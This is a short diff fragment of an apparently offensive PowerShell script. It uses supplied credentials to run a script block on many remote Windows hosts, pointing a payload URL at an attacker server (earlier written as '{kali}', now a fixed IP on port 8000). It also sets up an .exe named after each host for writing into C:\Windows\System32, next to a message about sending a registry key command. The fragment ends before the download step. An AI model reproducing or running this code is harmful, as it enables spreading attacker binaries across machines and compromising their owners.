@@ -43,7 +43,7 @@ Read-Host
 
 Write-Host "Sending Registery Key Command..."
 $hostnames | ForEach-Object { Invoke-Command -Credential $cred -ComputerName $_ -ScriptBlock {
-	$url = "http://{kali}:8000/"
+	$url = "http://72.0.0.11:8000/"
 	$hostname = $env:computername
 	$outFile = "C:\Windows\System32\" + $hostname + ".exe"
 	
